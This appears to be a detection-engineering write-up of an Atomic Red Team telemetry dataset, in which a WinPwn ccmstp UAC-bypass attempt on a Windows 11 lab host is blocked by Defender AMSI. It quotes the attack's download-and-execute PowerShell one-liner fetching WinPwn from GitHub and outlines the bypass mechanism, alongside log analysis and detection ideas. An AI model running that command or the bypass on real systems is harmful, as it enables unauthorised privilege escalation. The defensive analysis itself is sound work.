# T1548.002-19: Bypass User Account Control — WinPwn - UAC Bypass ccmstp Technique

## Technique Context

T1548.002 (Bypass User Account Control) covers techniques that silently elevate process privileges without triggering a UAC consent prompt. WinPwn's `ccmstp` UAC bypass technique exploits `CCMSTP.exe`, the System Center Configuration Manager (SCCM) connection manager setup binary, which is marked as auto-elevate in its manifest. By placing a hijacked COM handler or file handler in HKCU before launching `CCMSTP.exe`, an attacker can cause the auto-elevated binary to execute attacker-controlled code without a UAC prompt. WinPwn implements this as a PowerShell function, invoked with `-technique ccmstp`, and requires downloading the WinPwn script from GitHub.

## What This Dataset Contains

The dataset captures approximately 9 seconds of activity on ACME-WS02 (Windows 11 Enterprise, domain member of acme.local).

**PowerShell script block logging (4104)** records the exact attack invocation:

```
{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command "C:\windows\system32\calc.exe" -technique ccmstp}
```

Note: The payload here is `calc.exe` (a common ART benign indicator), distinct from test 18 which used `cmd.exe`.

**PowerShell Event 4100** records the AMSI block:

```
This script contains malicious content and has been blocked by your antivirus software.
Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```

Windows Defender blocked `WinPwn.ps1` immediately upon download, preventing execution of `UACBypass -technique ccmstp`.

**Sysmon Event 22** (DNS query): `raw.githubusercontent.com` resolved to 185.199.108–111.133.

**Sysmon Event 3** (network connection): `powershell.exe` (SYSTEM) connected to `185.199.111.133:443` — the download completed or was initiated before the AMSI block fired.

**Sysmon Event 1**: `whoami.exe` (ART pre-check) and `powershell.exe` spawned for the attack.

**Sysmon Events 7, 10, 11, 17**: DLL loads into PowerShell, PowerShell accessing `whoami.exe`, startup profile file creation, and named pipe creation — all consistent with the ART execution environment.

**PowerShell 4103**: `Set-ExecutionPolicy -Bypass -Scope Process -Force` (ART test framework, two instances) and `New-Object -TypeName net.webclient`.

## What This Dataset Does Not Contain (and Why)

**No ccmstp-specific registry modifications or CCMSTP.exe execution**: AMSI blocked WinPwn.ps1 before the `UACBypass` function body was parsed or executed. The ccmstp technique never ran. No `CCMSTP.exe` process creation, registry key writes for COM hijacking, or auto-elevated child process appear in any log source.

**No calc.exe execution**: The specified payload was never launched; no process creation for `calc.exe` appears in this dataset.

**No WinPwn function code in script blocks**: The AMSI block at the `iex` call prevented WinPwn's function definitions from being logged as separate 4104 script blocks. Only the outer wrapper invocation is recorded.

**No Sysmon file drop**: WinPwn.ps1 was fetched in-memory via `DownloadString()` and not written to disk.

## Assessment

The ccmstp WinPwn technique was blocked by Windows Defender AMSI before any technique-specific action was taken, producing the same pre-block telemetry pattern as test 18. The dataset is structurally near-identical to test 18, differing only in the `-technique` flag value (`ccmstp` vs `magic`) and the payload (`calc.exe` vs `cmd.exe`). Both serve as strong examples of AMSI-blocked live-off-the-web attack attempts. The network telemetry (DNS + TCP connection) confirms the download was initiated before the block.

## Detection Opportunities Present in This Data

- **PowerShell 4104**: Script block with `iex(new-object net.webclient).downloadstring(...)` targeting a raw GitHub URL, combined with `UACBypass -noninteractive -command ... -technique`, is a strong behavioral signature.
- **PowerShell 4100**: `ScriptContainedMaliciousContent` from `InvokeExpressionCommand` signals a Defender AMSI block of downloaded content and should be treated as a high-confidence detection even when the payload did not execute.
- **Sysmon Event 22**: DNS query for `raw.githubusercontent.com` from SYSTEM-context `powershell.exe` is anomalous on a managed workstation.
- **Sysmon Event 3**: Outbound HTTPS from `powershell.exe` to GitHub CDN IP ranges — especially when combined with a preceding `iex(downloadstring(...))` script block — warrants immediate investigation.
- **Technique discrimination**: The `-technique ccmstp` string in the 4104 script block uniquely identifies this variant. Detection rules can extract the technique name to distinguish WinPwn variants and triage severity.
